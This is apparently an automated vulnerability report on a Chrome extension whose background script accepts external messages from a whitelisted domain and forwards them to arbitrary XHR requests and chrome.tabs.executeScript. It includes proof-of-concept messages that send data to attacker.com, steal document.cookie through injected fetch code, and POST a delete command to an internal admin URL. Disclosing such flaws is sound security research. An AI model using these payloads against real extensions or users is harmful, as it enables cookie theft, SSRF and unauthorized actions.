# CoCo Analysis: coanndjpkfbeccjocblahpdjnojllhck

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: bg_chrome_runtime_MessageExternal → XMLHttpRequest_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/coanndjpkfbeccjocblahpdjnojllhck/opgen_generated_files/bg.js
Line 1046: xhttp.open(method, request.url, true);

**Code:**

```javascript
// Background script - bg.js (Lines 1032-1057)
// externally_connectable in manifest.json allows https://hethong.baouyorder.com/*
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, sendResponse) {
      if (request.action == "xhttp") {
          var xhttp = new XMLHttpRequest();
          var method = request.method ? request.method.toUpperCase() : 'GET';

          xhttp.onload = function () {
              callback(xhttp.responseText);
          };
          xhttp.onerror = function () {
              callback();
          };
          xhttp.open(method, request.url, true); // ← SINK 1: attacker-controlled URL
          if (method == 'POST') {
              if (typeof request.contentType !== "undefined") {
                  xhttp.setRequestHeader('Content-Type', request.contentType);
              } else {
                  xhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
              }
          }
          xhttp.send(request.data); // ← SINK 2: attacker-controlled data
          return true;
      }
      // ... other actions ...
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From https://hethong.baouyorder.com/* (whitelisted domain)
chrome.runtime.sendMessage(
  'EXTENSION_ID_HERE',  // Extension ID
  {
    action: "xhttp",
    method: "POST",
    url: "http://attacker.com/steal",  // ← attacker-controlled URL
    data: "sensitive=data",  // ← attacker-controlled data
    contentType: "application/json"
  },
  function(response) {
    console.log("SSRF executed:", response);
  }
);
```

**Impact:** SSRF vulnerability - The whitelisted domain https://hethong.baouyorder.com can make privileged cross-origin requests to ANY URL (including internal networks, localhost, cloud metadata endpoints) with extension's elevated privileges, bypassing CORS restrictions.

---

## Sink 2: bg_chrome_runtime_MessageExternal → XMLHttpRequest_post_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/coanndjpkfbeccjocblahpdjnojllhck/opgen_generated_files/bg.js
Line 1056: xhttp.send(request.data);

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From https://hethong.baouyorder.com/*
chrome.runtime.sendMessage(
  'EXTENSION_ID_HERE',
  {
    action: "xhttp",
    method: "POST",
    url: "http://internal.company.local/admin",  // ← internal URL
    data: "command=delete&target=all",  // ← malicious payload
    contentType: "application/x-www-form-urlencoded"
  }
);
```

**Impact:** Same as Sink 1 - SSRF with attacker-controlled POST data. Can exfiltrate data, perform privileged actions on internal services, or exploit internal APIs.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/coanndjpkfbeccjocblahpdjnojllhck/opgen_generated_files/bg.js
Line 1088: chrome.tabs.executeScript(tabArray[0].id, { code: request.code }, ...);

**Code:**

```javascript
// Background script - bg.js (Lines 1084-1094)
chrome.runtime.onMessageExternal.addListener(
  function (request, sender, sendResponse) {
      // ... other handlers ...
      if (request.action == "executeScript") {
          chrome.tabs.query(
            { currentWindow: true, active: true },
            function (tabArray) {
                chrome.tabs.executeScript(tabArray[0].id, { code: request.code }, // ← attacker-controlled code
                  function (results) { callback(results); });
            }
          )
          return true;
      }
  });
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From https://hethong.baouyorder.com/*
chrome.runtime.sendMessage(
  'EXTENSION_ID_HERE',
  {
    action: "executeScript",
    code: "alert(document.cookie); fetch('http://attacker.com/steal?cookie=' + document.cookie);"  // ← arbitrary code execution
  }
);
```

**Impact:** Arbitrary JavaScript code execution in the context of the currently active tab. If the user is on a sensitive page (e.g., taobao.com where the extension has content_scripts access, or any other page), the attacker can:
- Steal credentials, cookies, session tokens
- Perform actions on behalf of the user
- Exfiltrate sensitive data
- Modify page content
- Keylog user input

**Note:** The extension has content_scripts on multiple Chinese e-commerce sites (taobao.com, tmall.com, 1688.com, jd.com, etc.), giving implicit permission to executeScript on those domains. Even if the user is on another tab, arbitrary code execution is achieved on the active tab.
